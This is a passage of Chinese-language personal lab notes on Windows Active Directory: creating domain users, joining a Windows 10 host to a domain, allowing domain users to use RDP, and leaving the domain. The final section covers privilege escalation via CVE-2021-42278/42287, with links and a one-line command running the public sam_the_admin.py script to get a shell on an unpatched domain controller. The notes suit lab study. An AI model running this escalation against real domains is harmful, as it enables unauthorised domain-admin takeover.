> 最开始搜教程, 直接是`右键域名 -> 新建 -> 用户`, 这样创建的用户最后在域名页面就能看到了, 感觉不是很合适, 就有了上面的过程截图
>
> ![image-20230707104644079](http://cdn.ayusummer233.top/DailyNotes/202307071046182.png)
>
> 输入姓名和用户名并点击 `下一步`
>
> ![image-20230707104931561](http://cdn.ayusummer233.top/DailyNotes/202307071049682.png)
>
> 输入密码并确认, 复选框按照需求勾选即可, 然后点击 `下一步`:
>
> ![image-20230707105233446](http://cdn.ayusummer233.top/DailyNotes/202307071052516.png)
>
> `完成`:
>
> ![image-20230707105340177](http://cdn.ayusummer233.top/DailyNotes/202307071053271.png)
>
> 新建完成后可以在域名页面看到新建的用户
>
> ![image-20230707110151483](http://cdn.ayusummer233.top/DailyNotes/202307071101624.png)
>
> `右键该用户 -> 属性`
>
> ![image-20230707112004475](http://cdn.ayusummer233.top/DailyNotes/202307071120577.png)
>
> `账户 -> 登录到`
>
> ![image-20230707112120321](http://cdn.ayusummer233.top/DailyNotes/202307071121416.png)
>
> 默认是可以登录到所有计算机, 可以使用该账户将计算机添加到域, 加完域后可以指定该账户只能登录到指定计算机来做权限控制
>
> 可以自定义选择登录到下列计算机, 计算机名填写需要登录到的计算机的名称, 例如:
>
> ![image-20230707112430394](http://cdn.ayusummer233.top/DailyNotes/202307071124485.png)
>
> ![image-20230707112548523](http://cdn.ayusummer233.top/DailyNotes/202307071125761.png)
>
> ![image-20230707112608465](http://cdn.ayusummer233.top/DailyNotes/202307071126576.png)

---

#### 加域

在需要添加到域的主机上进行操作

配置网卡信息:

![image-20230707095227600](http://cdn.ayusummer233.top/DailyNotes/202307070952219.png)

![image-20230707095606303](http://cdn.ayusummer233.top/DailyNotes/202307070956456.png)

![image-20230707095811306](http://cdn.ayusummer233.top/DailyNotes/202307070958477.png)

> PS: 一般只有一张卡, 图里的另一张卡和域环境无关, 有其他用处, 这里可以忽略

将 DNS 服务器配成刚才设置的域控 IP

![image-20230707100001572](http://cdn.ayusummer233.top/DailyNotes/202307071000673.png)

> IP, 掩码和网关信息还是跟着网关进行配置, 这里当前添加的网卡的网关是 `192.168.4.1`, 掩码是 `24` 位的, 所以选了一个 IP 如上填写
>
> 这样的话域内主机和域控不在同一个网络范围, 需要双方添加路由才可联通
>
> 对于域内主机:
>
> ```cmd
> route add -p 192.168.0.0 mask 255.255.0.0 192.168.4.1
> ```
>
> ![image-20230707100722859](http://cdn.ayusummer233.top/DailyNotes/202307071007941.png)
>
> 对于域控, 只加了一张网卡, 路由如下, 默认走网关 `192.168.6.1` 可以访问到其他经由中间路由器设备转发的 `192` 网段的主机
>
> ![image-20230707101214125](http://cdn.ayusummer233.top/DailyNotes/202307071012172.png)
>
> ![image-20230707101314181](http://cdn.ayusummer233.top/DailyNotes/202307071013325.png)

打开 `Windows 设置 -> 系统 -> 关于`

![image-20230707101500852](http://cdn.ayusummer233.top/DailyNotes/202307071015005.png)

![image-20230707101535987](http://cdn.ayusummer233.top/DailyNotes/202307071015114.png)

![image-20230707101646217](http://cdn.ayusummer233.top/DailyNotes/202307071016359.png)

> 需要注意的是, 不是下面这张图里的重命名这台电脑:
>
> ![image-20230707101551531](http://cdn.ayusummer233.top/DailyNotes/202307071015675.png)

从此处进入修改域的页面:

![image-20230707101903682](http://cdn.ayusummer233.top/DailyNotes/202307071019769.png)

勾选隶属于 `域`, 填入域名并 `确定`:

![image-20230707102023738](http://cdn.ayusummer233.top/DailyNotes/202307071020829.png)

> 如果弹出此窗口则需要修改下计算机名(限定 15 个字符):
>
> ![image-20230707102135148](http://cdn.ayusummer233.top/DailyNotes/202307071021247.png)
>
> 这里是因为我的 Win10 基本上都是用直接打包好的 OVF 创建的, 所以会存在名称一样的情况
>
> 尝试修改为:
>
> ![image-20230707102343365](http://cdn.ayusummer233.top/DailyNotes/202307071023538.png)
>
> 发现超出长度了
>
> ![image-20230707102432729](http://cdn.ayusummer233.top/DailyNotes/202307071024873.png)

将计算机名修改为不重复的长度在规范内的字符串后点击 `确定` 则会弹出如下弹窗:

![image-20230707102627849](http://cdn.ayusummer233.top/DailyNotes/202307071026955.png)

输入有权限登录到该计算机的域账户的账密

![image-20230707112759281](http://cdn.ayusummer233.top/DailyNotes/202307071127385.png)

![image-20230707114516626](http://cdn.ayusummer233.top/DailyNotes/202307071145718.png)

逐级确定后需要重启计算机以生效:

![image-20230707115305866](http://cdn.ayusummer233.top/DailyNotes/202307071153295.png)

重启后就可以使用该域账户从控制台登入计算机了:

![image-20230707120146125](http://cdn.ayusummer233.top/DailyNotes/202307071201506.png)

![image-20230707132912542](http://cdn.ayusummer233.top/DailyNotes/202307071329987.png)

不过此时是无法使用此域账户远程登录这台计算机的, 因为 RDP 默认只允许本地管理员登录, 需要配置一下

> ![image-20230707141654004](http://cdn.ayusummer233.top/DailyNotes/202307071416105.png)

打开 `设置 -> 远程桌面 -> 选择可远程访问这台电脑的用户`:

![image-20230707142644383](http://cdn.ayusummer233.top/DailyNotes/202307071426687.png)

可以看到本地管理员账户 `Win10Pro` 已有远程权限, 还需要添加上域用户, 点击 `添加`:

![image-20230707142743465](http://cdn.ayusummer233.top/DailyNotes/202307071427557.png)

输入域用户名并 `检查名称`:

![image-20230707142916009](http://cdn.ayusummer233.top/DailyNotes/202307071429098.png)

在弹出的窗口中输入该域账户的账密, 然后点击确定:

![image-20230707143031446](http://cdn.ayusummer233.top/DailyNotes/202307071430572.png)

可以看到检查的名称已经出现在输入窗中了, 点击 `确定` 即可

![image-20230707143103873](http://cdn.ayusummer233.top/DailyNotes/202307071431015.png)

然后就可以使用该账户 RDP 到该计算机了:

![image-20230707150530128](http://cdn.ayusummer233.top/DailyNotes/202307071505728.png)

---

#### 从域中退出

仍然是加域的页面, 将隶属于的选项从域换到工作组, 然后随便起个工作组的名字再点击 `确定`, 输入域账户账密退出加域即可

![image-20230707134336159](http://cdn.ayusummer233.top/DailyNotes/202307071343331.png)

![image-20230707134826465](http://cdn.ayusummer233.top/DailyNotes/202307071348521.png)

![image-20230707134816708](http://cdn.ayusummer233.top/DailyNotes/202307071348794.png)

![image-20230707135004520](http://cdn.ayusummer233.top/DailyNotes/202307071350608.png)

![image-20230707135012984](http://cdn.ayusummer233.top/DailyNotes/202307071350068.png)


---


### 域内提权-42278/42287

> [域内提权漏洞CVE-2021-42287与CVE-2021-42278原理分析 - FreeBuf网络安全行业门户](https://www.freebuf.com/vuls/317773.html)
>
> [safebuffer/sam-the-admin: Exploiting CVE-2021-42278 and CVE-2021-42287 to impersonate DA from standard domain user --- safebuffer/sam-the-admin：利用 CVE-2021-42278 和 CVE-2021-42287 来模拟标准域用户的 DA (github.com)](https://github.com/safebuffer/sam-the-admin?tab=readme-ov-file)
>
> [eXploit – CVE-2021-42287/CVE-2021-42278 Weaponisation --- eXploit – CVE-2021-42287/CVE-2021-42278 武器化](https://exploit.ph/cve-2021-42287-cve-2021-42278-weaponisation.html)
>
> [CVE-2021-42278&42287(域控) 漏洞分析与利用 | KB-AT的博客 (kb-at-zero.github.io)](https://kb-at-zero.github.io/2021/12/19/CVE-2021-42278-42287(域控) 漏洞分析与利用/)

适用范围: 未打补丁的 Winserver, 具体可参阅上述连接, 似乎 winserver 2012  - 2022 都有覆盖

拿到一个域用户后, 保证当前 kali 主机能够连通域控主机, 使用 [safebuffer/sam-the-admin](https://github.com/safebuffer/sam-the-admin?tab=readme-ov-file) 中的脚本来 getshell

```bash
python sam_the_admin.py "域/用户:密码" -dc-ip [域控ip] -shell
```

![image-20231019165850749](http://cdn.ayusummer233.top/DailyNotes/202310191658100.png)

> PS: Python 3.11 安装 `impacket==0.9.24` 会出错, 建议使用 Python3.10

---



